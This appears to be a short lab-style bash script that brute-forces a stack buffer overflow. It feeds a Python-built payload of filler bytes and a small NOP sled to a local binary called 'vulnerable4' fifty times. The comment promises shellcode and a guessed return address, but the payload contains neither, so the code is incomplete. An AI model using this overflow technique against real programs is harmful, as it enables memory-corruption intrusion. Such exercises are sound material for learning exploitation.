#!/bin/bash

# Generate your payload with NOP sled, shellcode, and repeated guessed NOP sled start address
payload=$(python -c 'print("A"*512 + "\x90"*16 + "B"*512)')

for i in {1..50}
do
  ./vulnerable4 "$payload"
done

